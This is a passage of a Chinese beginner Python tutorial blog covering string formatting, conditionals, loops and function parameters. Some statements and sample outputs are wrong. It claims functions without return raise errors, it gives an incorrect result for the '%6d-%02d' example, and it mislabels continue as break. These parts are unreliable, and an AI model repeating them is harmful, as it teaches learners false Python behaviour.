<li>可见，1个中文字符经过UTF-8编码后通常<font color="#FF7F00"><strong>会占用3个字节，而1个英文字符只占用1个字节</strong></font>。</li>
<li>在操作字符串时，我们经常遇到str和bytes的互相转换。<font color="#FF7F00"><strong>为了避免乱码问题，应当始终坚持使用UTF-8编码对str和bytes进行转换</strong></font>。</li>
</ol>
</blockquote>
<br>

<br>

<h3 id="四-格式化"><a href="#四-格式化" class="headerlink" title="四. 格式化"></a><font color="#FF6347" face="Comic sans MS">四. 格式化</font></h3><blockquote>
<p><font color="#FF7F00"><strong>重要总结：</strong></font></p>
</blockquote>
<ol>
<li>一个常见的问题是如何输出格式化的字符串。<ol>
<li>我们经常会输出类似”亲爱的<code>xxx</code>你好！你<code>xx</code>月的话费是<code>xx</code>，余额是<code>xx</code>“之类的字符串，而<code>xxx</code>的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。</li>
</ol>
</li>
<li>在Python中，采用的格式化方式和C语言是一致的，用<font color="#FF7F00">**%**</font>实现。</li>
<li>%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。</li>
<li>格式化整数还可以指定<font color="#FF7F00"><strong>是否补0和整数</strong></font>；浮点数可以指定<font color="#FF7F00"><strong>小数的位数</strong></font>。</li>
<li>要输出%，用%对其进行转义，即用%%来表示一个%。</li>
<li>另一种格式化字符串的方法是使用字符串的<font color="#FF7F00"><strong>format()方法</strong></font>，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多</li>
</ol>
<br>

<p>常见的占位符有：</p>
<table>
<thead>
<tr>
<th align="center">占位符</th>
<th align="center">替换内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%d</td>
<td align="center">整数</td>
</tr>
<tr>
<td align="center">%f</td>
<td align="center">浮点数</td>
</tr>
<tr>
<td align="center">%s</td>
<td align="center">字符串</td>
</tr>
<tr>
<td align="center">%x</td>
<td align="center">十六进制整数</td>
</tr>
</tbody></table>
<br>

<p>示例代码：（里面的“//”并不代表注释符）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;Hello, %s&#x27;</span> % <span class="string">&#x27;world&#x27;</span>    // 替换一个不使用括号</span><br><span class="line">b = <span class="string">&#x27;Hi, %s, you have $%d.&#x27;</span> % (<span class="string">&#x27;Michael&#x27;</span>, <span class="number">1000000</span>)   // 替换多个使用括号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;%6d-%02d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>)  //  %<span class="number">6</span>d  表示输出<span class="number">3</span>之前有（<span class="number">6</span><span class="number">-1</span>）个空格输出</span><br><span class="line">                         //  %<span class="number">05</span>d 表示输出<span class="number">1</span>之前有（<span class="number">5</span><span class="number">-1</span>）个<span class="number">0</span>输出</span><br><span class="line">d = <span class="string">&#x27;%.2f&#x27;</span> % <span class="number">3.145926</span>    //  %<span class="number">.2</span>f 表示输出的浮点数保留两位小数，第三位小数&gt;=<span class="number">5</span>就向前进<span class="number">1</span></span><br><span class="line">e = <span class="string">&#x27;growth rate: %d %%&#x27;</span> % <span class="number">7</span>   //  转义，用%%表示一个%输出</span><br><span class="line">f=<span class="string">&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;</span>.format(<span class="string">&#x27;小明&#x27;</span>, <span class="number">17.125</span>)</span><br><span class="line">                         //  使用字符串format()方法，注意括号里面的<span class="number">1</span>的意义</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br><span class="line">print(f)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, world </span><br><span class="line">Hi, Michael, you have $<span class="number">1000000.</span> </span><br><span class="line">     <span class="number">3</span><span class="number">-000000001</span> </span><br><span class="line"><span class="number">3.15</span></span><br><span class="line">growth rate: <span class="number">7</span> % </span><br><span class="line">Hello, 小明, 成绩提升了 <span class="number">17.1</span>% </span><br></pre></td></tr></table></figure>

<br>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-条件语句与循环</title>
    <url>/post/Python-ConditionalStatements-loops/</url>
    <content><![CDATA[<p>记得冒号和换行的缩进呀…(｡◕︎‿◕︎)ﾉﾟ･ﾟ･</p>
<a id="more"></a>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>条件语句与循环</font> </center>

<br>

<br>

<h3 id="一-条件语句"><a href="#一-条件语句" class="headerlink" title="一. 条件语句"></a><font color="#FF6347" face="Comic sans MS">一. 条件语句</font></h3><br>

<ol>
<li><p>if-else-elif是条件语句，判断bool类型，判断为True就继续执行后面的缩进语句，判断为Flase则不执行缩进语句。</p>
</li>
<li><p>Python程序语言指定任何非0和非空（Null）值为True，0 或者 null为False。</p>
</li>
<li><p>Python<font color="#FF7F00"><strong>只执行if-elif-else 结构中的一个代码块</strong></font>，它依次检查每个条件测试，直到遇到通过了的条件测试。测试通过后，Python将执行紧跟在它后面的代码，并跳过余下的测试。</p>
</li>
<li><p>python 并<font color="#FF7F00"><strong>不支持 switch 语句</strong></font>，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p>
</li>
<li><p>设置if 语句的格式。在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格，例如，<code>if age &lt; 4:</code> 要比<code>if age&lt;4:</code> 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。</p>
</li>
<li><p>注意条件语句如果有多条缩进语句时<font color="#FF7F00"><strong>不能忘了冒号（ <code>:</code> ）</strong></font>，不像C语言或其它语言一样，if后面没有括号。</p>
</li>
</ol>
<br>

<p>书写格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;条件判断<span class="number">1</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">1</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">2</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">2</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">3</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">3</span>&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;执行<span class="number">4</span>&gt;</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-循环语句"><a href="#二-循环语句" class="headerlink" title="二. 循环语句"></a><font color="#FF6347" face="Comic sans MS">二. 循环语句</font></h3><br>

<p>Python提供了for循环和while循环（在Python中<strong>没有do..while循环</strong>）:</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-while-loop.html">while 循环</a></font></td>
<td align="left">在给定的判断条件为 true 时执行循环体，否则退出循环体。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-for-loop.html">for 循环</a></font></td>
<td align="left">重复执行语句</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-nested-loops.html">嵌套循环</a></font></td>
<td align="left">你可以在while循环体中嵌套for循环</td>
</tr>
</tbody></table>
<br>

<p><strong>循环控制语句</strong><br>循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-break-statement.html">break 语句</a></font></td>
<td align="left">在语句块执行过程中终止循环，并且跳出整个循环</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-continue-statement.html">continue 语句</a></font></td>
<td align="left">在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-pass-statement.html">pass 语句</a></font></td>
<td align="left">pass是空语句，是为了保持程序结构的完整性。</td>
</tr>
</tbody></table>
<br>

<h4 id="2-1-While-循环语句"><a href="#2-1-While-循环语句" class="headerlink" title="2.1 While 循环语句"></a><font color="#3CB371" face="Comic sans MS">2.1 While 循环语句</font></h4><p>执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（Null）的值均为True。当判断条件假False时，循环结束。其基本形式为（<strong>注意并没有括号</strong>）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件：</span><br><span class="line">    执行语句……</span><br></pre></td></tr></table></figure>

<br>

<p>Gif 演示 Python while 语句执行过程：</p>
<p><img data-src="https://i.loli.net/2019/03/01/5c789f82d8f65.gif" alt="loop-over-python-list-animation.gif"></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>循环使用 else 语句：</strong></font></p>
<p>在 python 中，while … else 在循环条件为 False 时执行 else 语句块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">&quot; is  less than 5&quot;</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">&quot; is not less than 5&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">1</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">2</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">3</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">4</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">5</span>  <span class="keyword">is</span> <span class="keyword">not</span> less than <span class="number">5</span> </span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-for-in-语句"><a href="#2-2-for-in-语句" class="headerlink" title="2.2 for..in 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 for..in 语句</font></h4><ol>
<li><p>Python for循环可以遍历任何序列的项目，如一个<font color="#FF7F00"><strong>列表</strong></font>或者一个<font color="#FF7F00"><strong>字符串</strong></font>。</p>
</li>
<li><p>Python 中的 for 语句和 C 或 Pascal 中的略有不同。通常的循环可能会依据一个等差数值步进过程（如 Pascal），或由用户来定义迭代步骤和中止条件（如 C ），Python 的 for 语句依据任意序列（列表或字符串）中的子项，按它们在序列中的顺序来进行迭代。</p>
</li>
<li><p>在迭代过程中修改迭代序列不安全（只有在使用列表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），你可以迭代它的复本。使用切割标识就可以很方便的做到这一点</p>
</li>
</ol>
<br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>for…in语句处理字符串和列表不同：</strong></font></p>
</blockquote>
<ol>
<li><strong>处理列表：</strong><font color="#FF7F00"><strong>每次取列表的一个元素赋给 in 前面的变量</strong></font>；</li>
<li><strong>处理字符串：</strong><font color="#FF7F00"><strong>每次取字符串的一个字符赋给 in 前面的变量</strong></font>；</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]:</span><br><span class="line">    print(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;beauty&#x27;</span>:</span><br><span class="line">     print(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">4</span> </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">b </span><br><span class="line">e </span><br><span class="line">a </span><br><span class="line">u </span><br><span class="line">t </span><br><span class="line">y </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>上例列表 for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。这就像把序列中的每一个数(或对象)分配给x，一次一个,然后为每个x值执行语句块。</strong></font></p>
</blockquote>
<br>

<h4 id="2-2-break、continue、pass-语句"><a href="#2-2-break、continue、pass-语句" class="headerlink" title="2.2 break、continue、pass 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 break、continue、pass 语句</font></h4><p><font color="#FF7F00"><strong>break语句：</strong></font> 在循环中，可以提前退出循环。<br><font color="#FF7F00"><strong>break语句：</strong></font> 在循环过程中，跳过当前的这次循环，直接开始下一次循环。<br><font color="#FF7F00"><strong>pass语句：</strong></font> pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。</p>
<br>    

<p>Python 语言 pass 语句语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 输出 Python 的每个字母</span></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;Python&#x27;</span>:</span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      print(<span class="string">&#x27;这是 pass 块&#x27;</span>)</span><br><span class="line">   print(<span class="string">&#x27;当前字母 :&#x27;</span>, letter)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">&#x27;Good bye!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">当前字母 : P </span><br><span class="line">当前字母 : y </span><br><span class="line">当前字母 : t </span><br><span class="line">这是 <span class="keyword">pass</span> 块 </span><br><span class="line">当前字母 : h </span><br><span class="line">当前字母 : o </span><br><span class="line">当前字母 : n </span><br><span class="line">Good bye! </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数</title>
    <url>/post/Python-Function/</url>
    <content><![CDATA[<p>有两种定义函数的方法，千万不要忘了冒号和<code>return</code>   ( ´⚰︎` ) </p>
<a id="more"></a>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数</font> </center>


<br>

<br>

<blockquote>
<p><strong>函数分为：</strong><font color="#FF7F00"><strong>内置（系统）函数和自定义函数</strong></font>。</p>
</blockquote>
<ol>
<li>自定义函数又分为普通（有名字的）函数和匿名（无名字的）函数，二者定义方式不一样；</li>
<li>自定义和函数里面还可嵌套定义其他函数，匿名函数定义时是一条语句，并且要赋值给一个变量指针。</li>
<li>普通函数的函数体如果为空，则必须放入一条pass语句，否则会报错；函数体不为空的必须有return语句，否则会报错。</li>
</ol>
<br>

<br>

<h3 id="一-定义函数"><a href="#一-定义函数" class="headerlink" title="一. 定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 定义函数</font></h3><blockquote>
<p><strong>自定义函数简单的规则：</strong></p>
</blockquote>
<ol>
<li>函数代码块以 <code>def</code> 关键词开头，依次写出函数名、括号、括号中的参数和冒号<code>:</code>。</li>
<li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li>
<li>函数内容以冒号起始，并且缩进写代码块结构。</li>
<li>用<code>return [表达式] </code>结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。还可以返回多个值，如<code>return x,y</code></li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>语法</strong></font></p>
<p>Python 定义函数使用 def 关键字，默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名（参数列表）:</span></span><br><span class="line">    函数体</span><br></pre></td></tr></table></figure>

<br>

<p>以自定义一个求绝对值的my_abs函数为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_abs</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -x</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">99</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-参数传递"><a href="#二-参数传递" class="headerlink" title="二. 参数传递"></a><font color="#FF6347" face="Comic sans MS">二. 参数传递</font></h3><p>在 python 中，类型属于对象，变量是没有类型的：<br><code>a=[1,2,3]</code><br><code>a=&quot;Runoob&quot;</code><br>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、可更改(mutable)与不可更改(immutable)对象</strong></font></p>
<p>在 python 中，<font color="#FF7F00"><strong>strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象</strong></font>。</p>
<p>python 函数的参数传递：</p>
<ul>
<li><p><strong>不可变类型：</strong>类似 c++ 的值传递，如 <strong>整数</strong>、<strong>字符串</strong>、<strong>元组</strong>。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</p>
</li>
<li><p><strong>可变类型：</strong>类似 c++ 的引用传递（地址），如 <strong>列表</strong>，<strong>字典</strong>。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</p>
</li>
</ul>
<blockquote>
<p>python 中<font color="#FF7F00"><strong>一切都是对象</strong></font>，严格意义我们不能说值传递还是引用传递，我们应该说<font color="#FF7F00"><strong>传不可变对象和传可变对象</strong></font>。</p>
</blockquote>
<br>

<p>python 传不可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span>(<span class="params"> a </span>):</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line">print( b ) <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p>
</blockquote>
</blockquote>
<br>

<p>传可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span>(<span class="params"> mylist </span>):</span></span><br><span class="line">   <span class="string">&quot;修改传入的列表&quot;</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;函数内取值1: &quot;</span>, mylist)</span><br><span class="line">   mylist.append(<span class="number">5</span>)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;函数内取值2: &quot;</span>, mylist)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;函数外取值: &quot;</span>, mylist)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">函数内取值<span class="number">1</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">函数内取值<span class="number">2</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br><span class="line">函数外取值:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、参数</strong></font></p>
<p><strong>以下是调用函数时可使用的正式参数类型：</strong></p>
<ol>
<li><p><font color="#FF7F00"><strong>必需参数：</strong></font>调用函数时以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
</li>
<li><p><font color="#FF7F00"><strong>关键字参数：</strong></font>允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
</li>
<li><p><font color="#FF7F00"><strong>默认参数：</strong></font>定义函数时可指定参数值，调用函数时，如果没有传递参数，则会使用默认参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>不定长参数：</strong></font>能处理比当初声明时更多的参数，这些参数被包装进一个<font color="#FF7F00"><strong>元组</strong></font>或<font color="#FF7F00"><strong>字典</strong></font>，通常，这些 可变 参数是参数列表中的最后一个，因为它们将把所有的剩余输入参数传递给函数。</p>
</li>
</ol>
<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>1. 必需参数：</strong></font></p>
<p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
<p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span>(<span class="params"> str </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    printme()</span><br><span class="line">TypeError: printme() missing <span class="number">1</span> required positional argument: <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>2. 关键字参数：</strong></font></p>
<p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。<br>以下实例中演示了函数参数的使用不需要使用指定顺序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>3. 默认参数：</strong></font></p>
<p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age = <span class="number">35</span> </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;------------------------&quot;</span>)</span><br><span class="line">printinfo( name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br><span class="line">------------------------</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">35</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>4. 不定长参数：</strong></font></p>
<blockquote>
<p><strong>你可能需要一个函数能处理比当初声明时更多的参数：</strong></p>
</blockquote>
<ol>
<li>加了星号 <code>*</code> 的参数会以<font color="#FF7F00"><strong>元组(tuple)</strong></font>的形式导入，存放所有未命名的变量参数。</li>
<li>加了两个星号<code>**</code>的参数会以<font color="#FF7F00"><strong>字典(dict)</strong></font>的形式导入。</li>
<li>声明函数时，参数中星号 * 可以单独出现。</li>
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
<br>

<ol>
<li>加了星号<code>*</code>的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, *vartuple </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">&quot;循环输出: &quot;</span>)</span><br><span class="line">      <span class="keyword">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">输出:</span><br><span class="line"><span class="number">10</span></span><br><span class="line">输出:</span><br><span class="line"><span class="number">70</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">60</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>加了两个星号<code>**</code>的参数会以字典的形式导入。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, **vardict </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo(<span class="number">1</span>, a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li>声明函数时，参数中星号 * 可以单独出现，例如:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
